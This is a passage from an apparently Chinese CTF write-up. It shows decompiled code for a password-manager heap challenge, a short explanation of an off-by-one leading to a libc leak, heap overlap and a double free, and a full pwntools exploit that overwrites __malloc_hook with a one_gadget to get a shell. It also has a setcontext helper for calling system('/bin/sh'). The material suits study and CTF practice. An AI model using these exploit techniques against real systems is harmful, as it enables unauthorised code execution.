  printf<span class="token punctuation">(</span><span class="token string">"Select index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"You can't delete a non-existent password."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  free<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>void <span class="token operator">**</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  memset<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 0x20uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关闭了tcahce的glibc 2.30，漏洞是在create password的时候有一个off by one 可以覆盖相邻地址堆块的 chunk size一个字节，通过 off by one绕过size的限制申请出unsortedbin，然后切分unsortedbin利用残留的bk指针泄露libc基地址，只需要控制一下 off by one的size就可以在切分unsortedbin后和下一个堆块完全重叠，造成heap overlap，之后doube free写malloc hook 为one gadget触发就好了</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>


elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>
is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"challs.tfcctf.com"</span>
PORT <span class="token operator">=</span> <span class="token number">31822</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">save_password</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"length"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"Enter credentials:"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"Name of the credentials:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete_credentials</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"Select index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>

save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"AAAAAAAA"</span><span class="token punctuation">,</span> <span class="token string">b"aaaaaaaa"</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"BBBBBBBB"</span><span class="token punctuation">,</span> <span class="token string">b"bbbbbbbb"</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"CCCCCCCC"</span><span class="token punctuation">,</span> <span class="token string">b"cccccccc"</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"DDDDDDDD"</span><span class="token punctuation">,</span> <span class="token string">b"dddddddd"</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"EEEEEEEE"</span><span class="token punctuation">,</span> <span class="token string">b"eeeeeeee"</span><span class="token punctuation">)</span>

delete_credentials<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
delete_credentials<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># unsorted bin </span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b"b"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># leak unsortedbin bk</span>


check_password<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x76c3f6bb4c90</span> <span class="token operator">-</span> <span class="token number">0x76c3f6800000</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>addr <span class="token operator">=</span> libc_base

free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xe1fa1</span>

save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"FFFFFFFF"</span><span class="token punctuation">,</span><span class="token string">"ffffffff"</span><span class="token punctuation">)</span> <span class="token comment"># heap overlap (cccccccc and ffffffff)</span>

<span class="token comment"># double free</span>
delete_credentials<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># delete cccccccc</span>
delete_credentials<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
delete_credentials<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># delete ffffffff</span>

save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b"f"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'D'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"d"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b"c"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
save_password<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b"c"</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"length"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="mcback2dabasics"><a href="#mcback2dabasics" class="headerlink" title="mcback2dabasics"></a>mcback2dabasics</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">void __fastcall __noreturn main<span class="token punctuation">(</span><span class="token builtin">int</span> a1<span class="token punctuation">,</span> char <span class="token operator">**</span>a2<span class="token punctuation">,</span> char <span class="token operator">**</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> choice<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>10h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>Ch<span class="token punctuation">]</span>
  unsigned __int64 v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v5 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setvbuf<span class="token punctuation">(</span>stdin<span class="token punctuation">,</span> 0LL<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setvbuf<span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> 0LL<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setvbuf<span class="token punctuation">(</span>stderr<span class="token punctuation">,</span> 0LL<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">63</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
    chunk_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      delete<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      puts<span class="token punctuation">(</span><span class="token string">"Is that all you got? Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      create<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      puts<span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 sub_9F4<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> idx<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  _DWORD nbytes<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>14h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v3<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

